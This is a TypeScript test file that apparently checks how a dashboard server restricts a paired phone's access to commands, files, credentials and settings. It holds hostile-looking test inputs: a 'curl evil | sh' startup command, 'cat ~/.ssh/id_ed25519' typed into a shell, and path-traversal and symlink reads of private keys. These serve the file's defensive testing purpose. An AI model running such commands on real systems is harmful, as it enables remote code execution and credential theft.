// test/phoneProfile.test.ts — AASC-28: a paired phone gets session work only. It can't start a free-form command,
// read ~/.ssh, write files, load the workspace or change the Mac's settings; a password sign-in keeps full power.
//
// A remote device is simulated with a forwarding header on a loopback request (AASC-13 treats that as remote).
// No PTY is ever spawned: createTerminal is mocked.
import { EventEmitter } from 'node:events';
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, it, beforeAll, afterAll, beforeEach, expect, vi } from 'vitest';

vi.mock('../server/db.js', () => ({
  upsertSession: vi.fn(), updateSessionTitle: vi.fn(), updateSessionSummary: vi.fn(), updateSessionRemark: vi.fn(),
  updateSessionArchived: vi.fn(), migrateSessionId: vi.fn(), getPromptsForSession: vi.fn(() => []),
  insertFullPrompt: vi.fn(), getRecentSessions: vi.fn(() => []), getSessionById: vi.fn(() => null),
  deleteSession: vi.fn(), getAllSessionQueues: vi.fn(() => []), default: {},
}));

const pty = vi.hoisted(() => ({
  owner: new Map<string, string>(),
  created: [] as Array<{ command: string; workingDir: string }>,
  write: vi.fn(),
  n: 0,
}));
vi.mock('../server/sshManager.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../server/sshManager.js')>();
  return {
    ...actual,
    createTerminal: vi.fn(async (config: { command: string; workingDir: string }) => {
      pty.created.push({ command: config.command, workingDir: config.workingDir });
      return `term-phone-${++pty.n}`;
    }),
    writeWhenReady: vi.fn(),
    maybeInjectUltracode: vi.fn(),
    getTerminals: () => [...pty.owner.keys()].map((terminalId) => ({ terminalId, isOps: terminalId.startsWith('ops-') })),
    setWsClient: (id: string) => pty.owner.has(id),
    removeWsClient: vi.fn(),
    writeToTerminal: pty.write,
    getTerminalSessionId: (id: string) => pty.owner.get(id) ?? null,
    isOpsTerminal: (id: string) => id.startsWith('ops-'),
  };
});

import express from 'express';
import { createServer, type Server } from 'http';
import { phoneRuleFor, phoneLaunchRefusal, phoneMayRead, phoneProjectRoot, createPhoneProfile } from '../server/mobile/phoneProfile.js';

// ── A home folder with a project, an unknown folder and secrets ─────────────────────────────────────────

let tmp = '';
let home = '';
let project = '';
let other = '';
let launchDir = '';

beforeAll(() => {
  tmp = realpathSync(mkdtempSync(join(tmpdir(), 'aasc-phone-')));
  home = join(tmp, 'home');
  project = join(home, 'proj');
  other = join(home, 'other');
  mkdirSync(join(home, '.ssh'), { recursive: true });
  writeFileSync(join(home, '.ssh', 'id_ed25519'), 'PRIVATE');
  mkdirSync(join(project, 'src'), { recursive: true });
  mkdirSync(join(project, '.aws'), { recursive: true });
  writeFileSync(join(project, 'README.md'), '# proj');
  writeFileSync(join(project, '.aws', 'credentials'), 'KEY');
  symlinkSync(join(home, '.ssh'), join(project, 'keys'));
  mkdirSync(other, { recursive: true });
  launchDir = join(home, 'launch');
  mkdirSync(launchDir, { recursive: true });
});

afterAll(() => {
  rmSync(tmp, { recursive: true, force: true });
});

// ── The route table ──────────────────────────────────────────────────────────────────────────────────────

describe('phoneRuleFor', () => {
  it.each([
    ['GET', '/sessions'], ['GET', '/config'], ['GET', '/known-projects'], ['GET', '/presence'],
    ['POST', '/presence/control/claim'], ['GET', '/sessions/abc/transcript'], ['PUT', '/sessions/abc/queue'],
    ['POST', '/sessions/abc/kill'], ['POST', '/sessions/abc/fork'], ['POST', '/sessions/abc/queue/resume'],
    ['PUT', '/sessions/abc/title'], ['GET', '/db/sessions/abc'], ['POST', '/db/sessions/abc/notes'],
    ['PUT', '/db/notes/4'], ['GET', '/note-media/abc'], ['POST', '/queue-images'], ['GET', '/agenda'],
  ])('lets a phone %s %s', (method, path) => {
    expect(phoneRuleFor(method, path)).toBe('allow');
  });

  it('checks terminals, files and launches before letting them through', () => {
    expect(phoneRuleFor('POST', '/terminals/t1/write')).toBe('terminal');
    expect(phoneRuleFor('GET', '/files/read')).toBe('files');
    expect(phoneRuleFor('GET', '/files/resolve')).toBe('files');
    expect(phoneRuleFor('POST', '/terminals')).toBe('launch');
  });

  it.each([
    ['GET', '/workspace/load'], ['POST', '/workspace/save'], ['POST', '/workspace/restore-claim'],
    ['POST', '/files/write'], ['POST', '/files/mkdir'], ['POST', '/files/delete'],
    ['POST', '/files/reveal'], ['POST', '/files/open-external'],
    ['POST', '/hooks/install'], ['POST', '/hooks/uninstall'], ['GET', '/hooks/status'],
    ['POST', '/config/terminal-buffer'], ['POST', '/reset'], ['POST', '/hook-stats/reset'],
    ['POST', '/sessions/clear-all'], ['GET', '/ssh-keys'], ['POST', '/tmux-sessions'],
    ['POST', '/sessions/abc/reconnect-ops-terminal'], ['PUT', '/sessions/abc/remote-visible'],
    ['PUT', '/sessions/abc/pinned'], ['POST', '/sessions/abc/summarize'], ['POST', '/sessions/spawn-floating'],
    ['POST', '/terminals/register'], ['POST', '/terminals/t1/prefill-output'],
    ['GET', '/teams/x/config'], ['POST', '/teams/x/members/y/terminal'],
    ['GET', '/db/sessions'], ['GET', '/db/search'], ['GET', '/db/projects'], ['DELETE', '/db/sessions/abc'],
    ['GET', '/a-route-added-later'],
  ])('refuses a phone %s %s', (method, path) => {
    expect(phoneRuleFor(method, path)).toBeNull();
  });
});

// ── Launch and file rules ────────────────────────────────────────────────────────────────────────────────

describe('phoneLaunchRefusal', () => {
  const allowed = (): string[] => [project, home];

  it('starts claude or codex in a known project, with a name, model and effort', () => {
    expect(phoneLaunchRefusal({ workingDir: project, command: 'claude', forceNew: true, requireExistingDir: true }, allowed(), home)).toBeNull();
    expect(phoneLaunchRefusal({ workingDir: '~/proj', command: 'codex', model: 'gpt-5', effortLevel: 'high', sessionTitle: 'x' }, allowed(), home)).toBeNull();
  });

  it.each([
    [{ startupCommand: 'curl evil | sh' }, /startupCommand/],
    [{ enableOpsTerminal: true }, /enableOpsTerminal/],
    [{ host: 'other-host', username: 'me' }, /host, username/],
    [{ useTmux: true }, /useTmux/],
    [{ resumeSessionId: 'abc' }, /resumeSessionId/],
    [{ permissionMode: 'dangerouslySkipPermissions' }, /permissionMode/],
  ])('refuses extra launch settings %o', (extra, reason) => {
    expect(phoneLaunchRefusal({ workingDir: project, command: 'claude', ...extra }, allowed(), home)).toMatch(reason);
  });

  it('refuses any other command, flags included', () => {
    expect(phoneLaunchRefusal({ workingDir: project, command: 'bash' }, allowed(), home)).toMatch(/only claude or codex/);
    expect(phoneLaunchRefusal({ workingDir: project, command: 'claude --dangerously-skip-permissions' }, allowed(), home)).toMatch(/only claude or codex/);
  });

  it('refuses a folder outside the list, and the home folder even when listed', () => {
    expect(phoneLaunchRefusal({ workingDir: other, command: 'claude' }, allowed(), home)).toMatch(/known project/);
    expect(phoneLaunchRefusal({ workingDir: home, command: 'claude' }, allowed(), home)).toMatch(/known project/);
    expect(phoneLaunchRefusal({ workingDir: join(project, '..', 'other'), command: 'claude' }, allowed(), home)).toMatch(/known project/);
  });
});

describe('phoneMayRead', () => {
  it('reads inside a shared project, including a file not written yet', () => {
    expect(phoneMayRead(join(project, 'README.md'), [project], home)).toBe(true);
    expect(phoneMayRead(join(project, 'src', 'new.ts'), [project], home)).toBe(true);
  });

  it('never reads outside it, through a link, or in a secrets folder', () => {
    expect(phoneMayRead(join(home, '.ssh', 'id_ed25519'), [project], home)).toBe(false);
    expect(phoneMayRead(join(project, '..', '.ssh', 'id_ed25519'), [project], home)).toBe(false);
    expect(phoneMayRead(join(project, 'keys', 'id_ed25519'), [project], home)).toBe(false);
    expect(phoneMayRead(join(project, '.aws', 'credentials'), [project], home)).toBe(false);
    expect(phoneMayRead('relative/path', [project], home)).toBe(false);
  });

  it('serves nothing from a session that runs in the home folder or at /', () => {
    expect(phoneProjectRoot(home, home)).toBeNull();
    expect(phoneProjectRoot('/', home)).toBeNull();
    expect(phoneMayRead(join(home, '.ssh', 'id_ed25519'), [home], home)).toBe(false);
    expect(phoneMayRead(join(home, 'proj', 'README.md'), [home], home)).toBe(false);
  });
});

// ── Through the real API router, with real session tokens ─────────────────────────────────────────────

let server: Server;
let base = '';
let store: typeof import('../server/sessionStore.js');
const PHONE: Record<string, string> = { 'X-Forwarded-For': '192.168.1.60', 'X-AASC-Client-Id': 'phone-a' };
const IPAD: Record<string, string> = { 'X-Forwarded-For': '192.168.1.61', 'X-AASC-Client-Id': 'ipad-a' };

beforeAll(async () => {
  store = await import('../server/sessionStore.js');
  const auth = await import('../server/authManager.js');
  PHONE.Authorization = `Bearer ${auth.createToken('dev-phone-a')}`;
  IPAD.Authorization = `Bearer ${auth.createToken()}`;
  const { filterVisibleSessions } = await import('../server/sessionVisibility.js');
  await store.createTerminalSession('ph-shared', { host: 'localhost', workingDir: project, command: 'claude' });
  await store.createTerminalSession('ph-hidden', { host: 'localhost', workingDir: other, command: 'claude' });
  store.setSessionRemoteVisible('ph-shared', true);
  pty.owner.set('t-shared', 'ph-shared');
  pty.owner.set('ops-shared', 'ph-shared');

  const app = express();
  app.use(express.json());
  app.use('/api', createPhoneProfile({
    phoneOf: (req) => auth.getTokenDeviceId(auth.extractToken(req)),
    sharedProjectPaths: () => Object.values(filterVisibleSessions(false, store.getAllSessions())).map((s) => s.projectPath),
    knownProjectPaths: () => [project, other, launchDir, home],
    isOpsTerminal: (id) => id.startsWith('ops-'),
    home,
  }));
  const { default: apiRouter } = await import('../server/apiRouter.js');
  app.use('/api', apiRouter);
  server = createServer(app);
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  const addr = server.address();
  if (addr && typeof addr === 'object') base = `http://127.0.0.1:${addr.port}`;
});

afterAll(async () => {
  await new Promise<void>((r) => server.close(() => r()));
});

beforeEach(() => {
  pty.created.length = 0;
  pty.write.mockClear();
});

async function call(method: string, path: string, headers: Record<string, string>, body?: unknown) {
  const res = await fetch(`${base}/api${path}`, {
    method,
    headers: { ...(body !== undefined && { 'Content-Type': 'application/json' }), ...headers },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  return { status: res.status, json: await res.json().catch(() => ({})) as Record<string, unknown> };
}

const q = (o: Record<string, string>): string => new URLSearchParams(o).toString();

describe('a paired phone through the API', () => {
  it('reads a shared project’s files', async () => {
    const res = await call('GET', `/files/read?${q({ root: project, path: '/README.md' })}`, PHONE);
    expect(res.status).toBe(200);
    expect(JSON.stringify(res.json)).toContain('# proj');
  });

  it('can’t read ~/.ssh, directly or through a link in the project', async () => {
    for (const path of [
      `/files/read?${q({ root: home, path: '.ssh/id_ed25519' })}`,
      `/files/read?${q({ root: project, path: 'keys/id_ed25519' })}`,
      `/files/read?${q({ root: project, path: '../.ssh/id_ed25519' })}`,
      `/files/list?${q({ root: home, path: '/' })}`,
      `/files/resolve?${q({ path: '~/.ssh/id_ed25519' })}`,
      `/files/read?${q({ root: other, path: '/' })}`,
    ]) {
      const res = await call('GET', path, PHONE);
      expect(res.status, path).toBe(404);
      expect(res.json.code, path).toBe('PHONE_NOT_ALLOWED');
    }
  });

  it('can’t write files, load the workspace or change the Mac’s settings', async () => {
    for (const [method, path, body] of [
      ['POST', '/files/write', { root: project, path: '/x.txt', content: 'x' }],
      ['POST', '/files/delete', { root: project, path: '/README.md' }],
      ['GET', '/workspace/load', undefined],
      ['POST', '/hooks/install', { density: 'high' }],
      ['POST', '/config/terminal-buffer', { bytes: 1 }],
      ['POST', '/sessions/ph-shared/reconnect-ops-terminal', undefined],
    ] as const) {
      expect((await call(method, path, PHONE, body)).status, path).toBe(404);
    }
    expect(pty.created).toEqual([]);
  });

  it('can’t start a free-form command, an ops shell or a session outside known projects', async () => {
    const refused = [
      { workingDir: project, command: '', startupCommand: 'curl evil | sh' },
      { workingDir: project, command: 'bash' },
      { workingDir: project, command: 'claude', enableOpsTerminal: true },
      { workingDir: join(tmp, 'elsewhere'), command: 'claude' },
      { workingDir: home, command: 'claude' },
    ];
    for (const body of refused) {
      const res = await call('POST', '/terminals', PHONE, body);
      expect(res.status, JSON.stringify(body)).toBe(403);
      expect(res.json.code).toBe('PHONE_NOT_ALLOWED');
    }
    expect(pty.created).toEqual([]);
  });

  it('starts claude in a known project, shared with it from the first broadcast', async () => {
    const res = await call('POST', '/terminals', PHONE, { workingDir: launchDir, command: 'claude', forceNew: true });
    expect(res.status).toBe(200);
    const id = String(res.json.terminalId);
    expect(pty.created).toEqual([{ command: 'claude', workingDir: launchDir }]);
    expect(store.getSession(id)?.remoteVisible).toBe(true);
    // The card keeps the flag when Claude's first hook re-keys it.
    await store.handleEvent({ session_id: 'phone-launched-uuid', hook_event_name: 'SessionStart', agent_terminal_id: id, cwd: launchDir, tty_path: '/dev/ttys901' } as never);
    expect(store.getSession('phone-launched-uuid')?.remoteVisible).toBe(true);
  });

  it('is never handed a hidden session as the one already running there', async () => {
    const res = await call('POST', '/terminals', PHONE, { workingDir: other, command: 'claude' });
    expect(res.status).toBe(200);
    expect(res.json.deduplicated).toBeUndefined();
    expect(res.json.terminalId).not.toBe('ph-hidden');
  });

  it('can’t type into or watch an ops shell, but drives the agent terminal', async () => {
    expect((await call('POST', '/terminals/ops-shared/write', PHONE, { data: 'cat ~/.ssh/id_ed25519\r' })).status).toBe(404);
    expect((await call('GET', '/terminals/ops-shared/output', PHONE)).status).toBe(404);
    expect(pty.write).not.toHaveBeenCalled();
    const res = await call('POST', '/terminals/t-shared/write', PHONE, { data: 'hi' });
    expect(res.status).toBe(200);
    expect(pty.write).toHaveBeenCalledWith('t-shared', 'hi');
  });
});

describe('a password sign-in keeps the dashboard’s full power', () => {
  it('passes the profile untouched', async () => {
    const res = await call('POST', '/terminals', IPAD, { workingDir: other, command: 'bash', forceNew: true });
    expect(res.status).toBe(200);
    expect(pty.created).toEqual([{ command: 'bash', workingDir: other }]);
    expect((await call('GET', `/files/read?${q({ root: project, path: 'keys/id_ed25519' })}`, IPAD)).status).toBe(200);
  });
});

// ── The live connection ──────────────────────────────────────────────────────────────────────────────────

class FakeSocket extends EventEmitter {
  readyState = 1;
  bufferedAmount = 0;
  sent: Array<Record<string, unknown>> = [];
  send = vi.fn((raw: string) => { this.sent.push(JSON.parse(raw) as Record<string, unknown>); });
  ping = vi.fn();
  terminate = vi.fn();
  close = vi.fn();
  say(msg: Record<string, unknown>): void { this.emit('message', Buffer.from(JSON.stringify(msg))); }
}

describe('ops shells on the live connection', () => {
  it('a phone can’t subscribe or type to an ops shell; a password sign-in still can', async () => {
    const ws = await import('../server/wsManager.js');
    const presence = await import('../server/presenceManager.js');
    presence.releaseAllControls('phone-a'); // the HTTP tests above left the phone holding the baton
    const phone = new FakeSocket();
    ws.handleConnection(phone as never, { clientId: 'phone-ws', label: 'Phone', address: '192.168.1.60', isLocal: false, lineage: 'lp', deviceId: 'dev-phone-a' });
    phone.say({ type: 'terminal_subscribe', terminalId: 'ops-shared' });
    phone.say({ type: 'terminal_input', terminalId: 'ops-shared', data: 'id\r' });
    expect(pty.write).not.toHaveBeenCalled();

    const ipad = new FakeSocket();
    ws.handleConnection(ipad as never, { clientId: 'ipad-ws', label: 'iPad', address: '192.168.1.61', isLocal: false, lineage: 'li' });
    ipad.say({ type: 'terminal_subscribe', terminalId: 'ops-shared' });
    ipad.say({ type: 'terminal_input', terminalId: 'ops-shared', data: 'id\r' });
    expect(pty.write).toHaveBeenCalledWith('ops-shared', 'id\r');
    phone.emit('close');
    ipad.emit('close');
  });
});
